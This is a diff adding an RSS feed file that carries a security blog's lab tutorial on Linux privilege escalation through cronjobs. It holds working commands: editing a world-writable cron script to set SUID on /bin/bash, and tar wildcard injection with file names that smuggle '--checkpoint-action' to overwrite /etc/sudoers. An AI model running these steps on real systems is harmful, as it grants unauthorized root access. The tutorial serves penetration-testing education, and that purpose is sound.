@@ -1,0 +1,155 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>privilege escalation Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/privilege-escalation/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/privilege-escalation/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Fri, 07 Feb 2020 09:06:23 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>privilege escalation Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/privilege-escalation/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Linux Privilege Escalation by Exploiting Cronjobs</title>
+		<link>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/</link>
+					<comments>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 28 Jan 2020 16:42:58 +0000</pubDate>
+				<category><![CDATA[Penetration Testing]]></category>
+		<category><![CDATA[Privilege Escalation]]></category>
+		<category><![CDATA[cronjob]]></category>
+		<category><![CDATA[cronjob exploitation]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[privilege escalation]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25398</guid>
+
+					<description><![CDATA[<p>In this blog I will share procedure to enumerate and exploit Cronjob. Before going for exploitation of cronjob we are...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/">Linux Privilege Escalation by Exploiting Cronjobs</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>In this blog I will share procedure to enumerate and exploit <strong>Cronjob</strong>. Before going for exploitation of cronjob we are going to find the answer for the question</p>
+<h5><strong>“What is Cronjob ?”</strong></h5>
+<p><strong>Cron</strong> is a utility that allows Linux users to do specific task on the server at a given time and date.Consider system admin is required to take the backup of server at regular interval. It means system admin has to do repeated task at certain interval.This repeated task at certain interval can be automated in Linux using cron utility. This automated repeated task is known as cronjob and a table or file that maintain this cronjob is known as crontab. Linux maintains separate crontab for each and every user.Given below is the syntax to define a cronjob in <strong>crontab</strong>.</p>
+<p><img decoding="async" fetchpriority="high" class="alignnone wp-image-25365" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/1.png" alt="" width="610" height="285" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/1.png 699w, https://www.armourinfosec.com/wp-content/uploads/2020/01/1-300x140.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>A single line in the crontab represent a cronjob. Cronjob is divided into three parts. All three parts are described below.</p>
+<h5>When to perform cronjob ?</h5>
+<p>First five numeric value represents the time of execution of the cronjob. Now let&#8217;s understand the five numeric value.</p>
+<ul>
+<li>Minute  &#8211;  First value represents minute ranges between 0 to 59 and * means any minute.</li>
+<li>Hour      &#8211; Second value represent Hour ranges between 0 to 24 and * means any hour.</li>
+<li>Day of month  &#8211; Third value represents day of month ranges between 1 to 31 and * means any day.</li>
+<li>Month  &#8211; Fourth value represents month ranges between 1 to 12 and * means any month.</li>
+<li>Day of week  &#8211; Fifth value represents the day of week ranges between 0 to 6 starting from Sunday and * means any day of week.</li>
+</ul>
+<h5>By whom privileges does the task perform ?</h5>
+<p>The value Just after the numeric value represents the user whose privileges will be used to accomplish the task.</p>
+<h5>Which command to be execute ?</h5>
+<p>After defining the user we need to provide the command to be executed at that time.<br />
+I hope we found our answer and now we will learn to escalate privileges through cronjob. For better understanding i am dividing further blog into two parts Enumeration and Exploitation.</p>
+<h4>Cronjob Enumeration</h4>
+<p>Lets start with the enumeration of the cronjob. The cronjob enumeration includes, finding and understanding the task that cronjob was assinged.There are following types of cronjob that we have to find.</p>
+<h5>User based Cronjob</h5>
+<p>In Linux each and every user can perform cronjobs. Each and every user maintains a crontab for their cronjobs. The location of the crontab of each user is in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true">/var/spool/cron/crontabs/'crontab_of_the_each_user_named_as_their_username'</pre>
+<p>The above directory is only accessible through root user. Normal user can check their cronjobs using command.</p>
+<pre class="theme:familiar lang:sh decode:true ">crontab -l</pre>
+<h5>Application based Cronjob</h5>
+<p>Certain application in Linux uses cronjob to perform their task. All the cronjobs that are created by any application is placed in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true ">/etc/cron.d</pre>
+<h5>Anacron</h5>
+<p>Anacron is defined as the cron with ability to performed the task that are skipped due to some reasons.This type of cronjob are placed in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true ">/etc/anacrontab</pre>
+<p>Above three are the possible ways to find the cronjobs. Now for understanding them only thing you have to do is read them.</p>
+<p><strong>Pro tip : If you want to know about the cronjobs of the other user then you can use the tool pspy(pspy32 for 32 bit and pspy64 for 64bit).</strong></p>
+<p>Download link : <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
+<h4>Cronjob Exploitation</h4>
+<p>From the above phase you found a cronjob and understands the working of the same.Now there are two possible ways to exploit the cronjob. There may be more!!!</p>
+<p>For following demonstration I am using <strong>CentOS</strong> as target of evaluation and <strong>Kali Linux</strong> as attacker system.</p>
+<h5>File Overwrite</h5>
+<p><strong>Situation where the vulnerability arises :</strong></p>
+<p>When a user defines a cronjob that runs a script, that script is writable by attacker then attacker can go for the file overwrite. Now consider a situation where sysadmin defines a cronjob that clears all files in /tmp/demo directory every 2 min. We will setup lab for the same situation and will exploit it.</p>
+<p><strong>Setting up the lab with same vulnerability :</strong></p>
+<p>I had created a demo directory in <strong>tmp</strong> and placed some files in it (demo).</p>
+<pre class="theme:familiar lang:sh decode:true">pwd
+touch 1.txt 2.txt 3.txt 4.php
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25371" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2.png" alt="" width="610" height="141" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2.png 607w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2-300x69.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets create a python script to delete all files from demo and setting permissions to the file.</p>
+<pre class="theme:familiar lang:sh decode:true">cat cleanup.py
+chmod 777 cleanup.py</pre>
+<p><img decoding="async" class="alignnone wp-image-25401" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3.png" alt="" width="610" height="224" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3.png 684w, https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3-300x110.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Next thing we need to do is setup cronjob.</p>
+<pre class="theme:familiar lang:sh decode:true ">cat /etc/crontab</pre>
+<p><img decoding="async" class="alignnone wp-image-25374" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2.png" alt="" width="610" height="249" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2.png 668w, https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2-300x123.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets verify our cronjob.</p>
+<pre class="theme:familiar lang:sh decode:true">ls
+date
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25402" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3.png" alt="" width="400" height="252" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3.png 593w, https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3-300x189.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></p>
+<h5>Exploiting the vulnerability :</h5>
+<p>We successfully created a cronjob and verified it now lets exploit it. On enumerating the target we see that there is a cronjob running on the system which running the script.</p>
+<p><img decoding="async" class="alignnone wp-image-25376" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2.png" alt="" width="610" height="354" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2.png 650w, https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2-300x174.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Script is world writable file (777 permission) and we can edit it. There are many way from here to escalate privileges. We are going to set <strong>suid</strong> bit on <strong>/bin/bash</strong> by replacing “<strong>rm -r /tmp/demo</strong>” from  “<strong>chmod u+s /bin/bash</strong>”.</p>
+<pre class="theme:familiar lang:sh decode:true ">cat cleanup.py</pre>
+<p><img decoding="async" class="alignnone wp-image-25377" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1.png" alt="" width="610" height="262" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1.png 619w, https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1-300x129.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p><strong>After waiting two minute we will run /bin/bash to escalate privilege.</strong></p>
+<pre class="theme:familiar lang:sh decode:true">whoami
+/bin/bash -p
+whoami</pre>
+<p><img decoding="async" class="alignnone wp-image-25378" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1.png" alt="" width="610" height="205" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1.png 607w, https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1-300x101.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<h4>Wildcard Injection :</h4>
+<h5>Situation where the vulnerability arises :</h5>
+<p>When the command is  assigned to a cronjob, contains a wildcard operator then attacker can go for wildcard injection to escalate privilege. Now consider a situation where sysadmin sets up a cronjob that creates a tar file, of all the content of user and store them in <strong>/var/backup</strong>.</p>
+<h5>Setting up the lab with same vulnerability:</h5>
+<p>Lets create some file in <strong>/home/armour/</strong> data directory which we will backup.</p>
+<pre class="theme:familiar lang:sh decode:true">touch 1.txt 2.txtx 4.txt 5.php
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25379" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1.png" alt="" width="610" height="73" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1.png 686w, https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1-300x36.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1-672x82.png 672w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now we schedule a cronjob to store the backup into <strong>/var/backup</strong></p>
+<pre class="theme:familiar lang:sh decode:true ">cat /etc/crontab</pre>
+<p><img decoding="async" class="alignnone wp-image-25380" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1.png" alt="" width="610" height="236" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1.png 677w, https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1-300x116.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Lets verify out objective.</p>
+<pre class="theme:familiar lang:sh decode:true">ls
+date</pre>
+<p><img decoding="async" class="alignnone wp-image-25381 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2.png" alt="" width="580" height="247" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2.png 580w, https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2-300x128.png 300w" sizes="(max-width: 580px) 100vw, 580px" /></p>
+<h5>Exploiting the vulnerability :</h5>
+<p>We successfully created our working environment, now we will exploit the vulnerability following is the check. Checking cronjob on target gives us following result.</p>
+<p><img decoding="async" class="alignnone wp-image-25382" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1.png" alt="" width="610" height="234" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1.png 645w, https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1-300x115.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets get back to <strong>/home/armour/data</strong> directory and we will create some files.</p>
+<pre class="theme:familiar lang:sh decode:true ">echo 'echo "armour ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; test.sh
+echo "" &gt; "--checkpoint-action=exec=sh test.sh"
+echo "" &gt; --checkpoint=1
+tar cf archive.tar *</pre>
+<p><img decoding="async" class="alignnone wp-image-25383" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1.png" alt="" width="610" height="61" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1.png 675w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1-300x30.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1-672x67.png 672w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>When cronjob will run then it will provide <strong>sudo</strong> right to <strong>user:armour</strong>.</p>
+<pre class="theme:familiar lang:sh decode:true ">whoami
+sudo bash -l</pre>
+<p><img decoding="async" class="alignnone wp-image-25384" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1.png" alt="" width="610" height="254" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1.png 615w, https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1-300x125.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/">Linux Privilege Escalation by Exploiting Cronjobs</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
